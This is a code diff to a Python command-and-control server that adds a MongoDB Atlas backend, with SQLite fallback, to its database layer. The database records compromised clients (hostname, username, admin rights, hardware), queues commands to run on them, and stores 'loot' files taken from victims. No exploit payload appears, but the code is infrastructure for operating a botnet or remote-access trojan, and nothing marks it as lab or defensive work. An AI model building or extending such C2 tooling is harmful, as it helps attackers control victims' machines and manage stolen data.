@@ -33,6 +33,23 @@ from colorama import Fore, Style, Back
 # Initialize colorama
 colorama.init()
 
+# Load .env file if present (manual loader — no dependency needed)
+def _load_dotenv():
+    env_path = Path(__file__).parent / '.env'
+    if env_path.exists():
+        with open(env_path) as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#') and '=' in line:
+                    key, _, value = line.partition('=')
+                    key = key.strip()
+                    value = value.strip().strip('"').strip("'")
+                    if key and key not in os.environ:
+                        os.environ[key] = value
+
+_load_dotenv()
+
+
 @dataclass
 class ServerConfig:
     host: str = '0.0.0.0'
@@ -58,30 +75,30 @@ class CryptoManager:
         return json.loads(self.fernet.decrypt(data).decode())
 
 class DatabaseManager:
-    def __init__(self, db_path: str):
+    def __init__(self, db_path: str, mongodb_uri: str = None):
         self.db_path = db_path
-        import os
-        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
-        self._init_db()
-    def _conn(self):
-        conn = sqlite3.connect(self.db_path, check_same_thread=False)
-        conn.execute('PRAGMA journal_mode=WAL')
-        conn.execute('PRAGMA synchronous=NORMAL')
-        conn.row_factory = sqlite3.Row
-        return conn
-    def _init_db(self):
-        c = self._conn()
-        c.execute('CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, ip_address TEXT, hostname TEXT, os TEXT, last_seen TEXT)')
-        # Schema migration: Add 'username' column if missing
-        try:
-            c.execute('ALTER TABLE clients ADD COLUMN username TEXT')
-        except: pass
-        try:
-            c.execute("ALTER TABLE clients ADD COLUMN status TEXT DEFAULT 'offline'")
-        except: pass
-        try:
-            c.execute("ALTER TABLE clients ADD COLUMN is_admin BOOLEAN DEFAULT 0")
-        except: pass
+        self.mongodb_uri = mongodb_uri or os.environ.get('MONGODB_URI')
+        self.use_mongo = bool(self.mongodb_uri)
+        
+        if self.use_mongo:
+            try:
+                from pymongo import MongoClient
+                from pymongo.server_api import ServerApi
+                self.client = MongoClient(self.mongodb_uri, server_api=ServerApi('1'))
+                self.db = self.client.get_database('c2_database')  # Same DB as GUI
+                print(Fore.GREEN + "[*] Connected to MongoDB Atlas" + Style.RESET_ALL)
+                self._init_mongo()
+            except Exception as e:
+                print(Fore.RED + f"[!] MongoDB connection failed: {e}. Falling back to SQLite." + Style.RESET_ALL)
+                self.use_mongo = False
+                self._init_sqlite()
+        else:
+            os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
+            self._init_sqlite()
+
+    def _init_sqlite(self):
+        c = self._conn_sqlite()
+        c.execute('CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, ip_address TEXT, hostname TEXT, os TEXT, username TEXT, status TEXT DEFAULT \'offline\', last_seen TEXT, is_admin BOOLEAN DEFAULT 0, gpu TEXT, motherboard TEXT)')
         c.execute('''
             CREATE TABLE IF NOT EXISTS commands (
                 id TEXT PRIMARY KEY,
@@ -98,66 +115,124 @@ class DatabaseManager:
                 is_active BOOLEAN DEFAULT 0
             )
         ''')
-        try:
-            c.execute('ALTER TABLE system_info ADD COLUMN uptime REAL')
-        except: pass
-        try:
-            c.execute('ALTER TABLE clients ADD COLUMN gpu TEXT')
-        except: pass
-        try:
-            c.execute('ALTER TABLE clients ADD COLUMN motherboard TEXT')
-        except: pass
         c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, timestamp TEXT)')
-        
-        # Reset all clients to offline and mark commands as inactive on server restart
         try:
             c.execute("UPDATE clients SET status = 'offline'")
             c.execute("UPDATE commands SET is_active = 0 WHERE is_active = 1")
         except: pass
-        
         c.commit()
+
+    def _init_mongo(self):
+        # Collections are created lazily, but we can ensure indexes
+        self.db.clients.create_index("id", unique=True)
+        self.db.commands.create_index("id", unique=True)
+        self.db.commands.create_index("client_id")
+        self.db.commands.create_index("status")
+        
+        # Reset live states
+        self.db.clients.update_many({}, {"$set": {"status": "offline"}})
+        self.db.commands.update_many({"is_active": 1}, {"$set": {"is_active": 0}})
+
+    def _conn_sqlite(self):
+        conn = sqlite3.connect(self.db_path, check_same_thread=False)
+        conn.execute('PRAGMA journal_mode=WAL')
+        conn.row_factory = sqlite3.Row
+        return conn
+
     def execute(self, q, p=()):
-        conn = self._conn()
-        res = conn.execute(q, p)
-        conn.commit()
-        return res
+        if not self.use_mongo:
+            conn = self._conn_sqlite()
+            res = conn.execute(q, p)
+            conn.commit()
+            return res
+        return None # Not used for Mongo logic directly
+
     def get_pending_commands(self):
-        c = self._conn()
-        res = c.execute("SELECT * FROM commands WHERE status = 'pending' ORDER BY created_at ASC").fetchall()
-        return [dict(r) for r in res]
+        if self.use_mongo:
+            cmds = list(self.db.commands.find({"status": "pending"}).sort("created_at", 1))
+            return cmds
+        else:
+            c = self._conn_sqlite()
+            res = c.execute("SELECT * FROM commands WHERE status = 'pending' ORDER BY created_at ASC").fetchall()
+            return [dict(r) for r in res]
+
     def update_command_status(self, cmd_id, status, result=None, error=None, is_active=None):
         ts = datetime.datetime.now().isoformat()
         
-        # Base query and params
-        updates = ["status = ?", "updated_at = ?"]
-        params = [status, ts]
-        
-        # Only update result if provided
-        if result is not None:
-            updates.append("result = ?")
-            params.append(result)
+        if self.use_mongo:
+            update_fields = {"status": status, "updated_at": ts}
+            if result is not None: update_fields["result"] = result
+            if error is not None: update_fields["error_message"] = error
             
-        # Only update error_message if provided
-        if error is not None:
-            updates.append("error_message = ?")
-            params.append(error)
+            if is_active is not None:
+                update_fields["is_active"] = is_active
+            elif status in ('completed', 'failed', 'cancelled'):
+                update_fields["is_active"] = 0
+            elif status == 'executing':
+                update_fields["is_active"] = 1
+                
+            if status in ('completed', 'failed', 'cancelled'):
+                update_fields["execution_time"] = ts
+                
+            self.db.commands.update_one({"id": cmd_id}, {"$set": update_fields})
+        else:
+            # Base query and params for SQLite
+            updates = ["status = ?", "updated_at = ?"]
+            params = [status, ts]
+            if result is not None:
+                updates.append("result = ?")
+                params.append(result)
+            if error is not None:
+                updates.append("error_message = ?")
+                params.append(error)
+            if is_active is not None:
+                updates.append("is_active = ?")
+                params.append(is_active)
+            elif status in ('completed', 'failed', 'cancelled'):
+                updates.append("is_active = 0")
+            elif status == 'executing':
+                updates.append("is_active = 1")
+            if status in ('completed', 'failed', 'cancelled'):
+                updates.append("execution_time = ?")
+                params.append(ts)
             
-        if is_active is not None:
-            updates.append("is_active = ?")
-            params.append(is_active)
-        elif status in ('completed', 'failed', 'cancelled'):
-            updates.append("is_active = 0")
-        elif status == 'executing':
-            updates.append("is_active = 1")
-            
-        if status in ('completed', 'failed', 'cancelled'):
-            updates.append("execution_time = ?")
-            params.append(ts)
-            
-        q = f"UPDATE commands SET {', '.join(updates)} WHERE id = ?"
-        params.append(cmd_id)
-        
-        self.execute(q, params)
+            q = f"UPDATE commands SET {', '.join(updates)} WHERE id = ?"
+            params.append(cmd_id)
+            self.execute(q, params)
+
+    def register_client(self, client_id, info, ip):
+        ts = datetime.datetime.now().isoformat()
+        if self.use_mongo:
+            client_data = {
+                "id": client_id,
+                "ip_address": ip,
+                "hostname": info.get('hostname'),
+                "os": info.get('os'),
+                "username": info.get('username'),
+                "gpu": info.get('gpu'),
+                "motherboard": info.get('motherboard'),
+                "status": "online",
+                "last_seen": ts,
+                "is_admin": info.get('is_admin', 0)
+            }
+            self.db.clients.update_one({"id": client_id}, {"$set": client_data}, upsert=True)
+        else:
+            self.execute("INSERT OR REPLACE INTO clients (id, ip_address, hostname, os, username, gpu, motherboard, status, last_seen, is_admin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                        (client_id, ip, info.get('hostname'), info.get('os'), info.get('username'), info.get('gpu', ''), info.get('motherboard', ''), 'online', ts, info.get('is_admin', 0)))
+
+    def save_loot(self, client_id, l_type, filename, l_path):
+        ts = datetime.datetime.now().isoformat()
+        if self.use_mongo:
+            self.db.loot.insert_one({
+                "client_id": client_id,
+                "type": l_type,
+                "filename": filename,
+                "path": l_path,
+                "timestamp": ts
+            })
+        else:
+            self.execute("INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?, ?, ?, ?, ?)",
+                        (client_id, l_type, filename, l_path, ts))
 
 class AdvancedC2Server:
     def __init__(self, config: ServerConfig):
